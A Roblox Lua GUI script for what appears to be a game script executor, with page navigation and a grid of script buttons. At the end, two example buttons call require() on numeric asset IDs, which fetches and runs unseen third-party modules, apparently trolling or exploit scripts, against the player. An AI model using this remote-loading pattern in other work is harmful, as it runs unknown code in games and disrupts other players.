-- Table of pages
local pages = {
	unable["button holder"],
	unable["button holder 2"],
	unable["button holder 3"]
}

local currentPageIndex = 1 -- Start on the first page
local savedPageIndex = 1 -- Variable to save the last page visited

-- Function to update page visibility
local function updatePages()
	for index, page in ipairs(pages) do
		page.Visible = (index == currentPageIndex)
	end
end

-- Update the 'Next Page' button functionality
unable["next page"].MouseButton1Click:Connect(function()
	playclicksound()
	currentPageIndex = currentPageIndex % #pages + 1 -- Cycle to the next page
	savedPageIndex = currentPageIndex -- Save the new page index
	updatePages()
end)

-- Update the 'Previous Page' button functionality
unable["previous page"].MouseButton1Click:Connect(function()
	playclicksound()
	currentPageIndex = (currentPageIndex - 2) % #pages + 1 -- Cycle to the previous page
	savedPageIndex = currentPageIndex -- Save the new page index
	updatePages()
end)

-- Adjust the "scripts tab" button functionality
unable["scripts tab"].MouseButton1Click:Connect(function()
	playclicksound()

	-- Hide other elements
	unable["executor scrolling frame"].Visible = false
	unable["execute button"].Visible = false
	unable["list of commands"].Visible = false
	unable["command bar"].Visible = false
	unable["execute command button"].Visible = false
	unable["asset id type indicator"].Visible = false
	unable["next page 2 button"].Visible = false
	unable["previous page 2 button"].Visible = false
	unable["switch asset id type button"].Visible = false
	unable["switch asset id type button 2"].Visible = false

	-- Show navigation buttons and restore saved page
	unable["next page"].Visible = true
	unable["previous page"].Visible = true
	currentPageIndex = savedPageIndex -- Restore the saved page
	updatePages()
end)

-- Table to store buttons
local buttonList = {}

-- Function to create a new button
function newscriptbutton(buttonText, onClick)
	-- Ensure there are no more than 9 buttons
	if #buttonList >= 9 then
		warn("Maximum of 9 buttons reached.")
		return
	end

	-- Calculate button position based on index
	local index = #buttonList + 1
	local row = math.floor((index - 1) / 3) -- Row index (0, 1, 2)
	local column = (index - 1) % 3 -- Column index (0, 1, 2)
	local xOffset = column * 117 -- Horizontal spacing
	local yOffset = row * 73 -- Vertical spacing (68 height + 6 spacing)

	-- Create the button
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0, 111, 0, 68)
	button.Position = UDim2.new(0, xOffset, 0, yOffset)
	button.BackgroundColor3 = unable["default background color"]
	button.BorderColor3 = unable["default border color"]
	button.BorderSizePixel = 1
	button.TextColor3 = unable["default border color"]
	button.Font = Enum.Font.RobotoMono
	button.TextSize = 15
	button.TextScaled = false
	button.Text = buttonText
	button.TextXAlignment = Enum.TextXAlignment.Center
	button.TextYAlignment = Enum.TextYAlignment.Center
	button.Parent = unable["button holder"]
	button.ZIndex = 19
	button.Visible = true

	-- Connect the onClick function and play sounds
	button.MouseButton1Click:Connect(function()
		playclicksound()
		onClick()
	end)

	-- Add the button to the list
	table.insert(buttonList, button)
end

-- Example usage:
newscriptbutton("immortality\nlord", function()
	require(6534274227)(unable["local player"].Name)
end)

newscriptbutton("john doe", function()
	require(2845929020).ooga(unable["local player"].Name)
end)

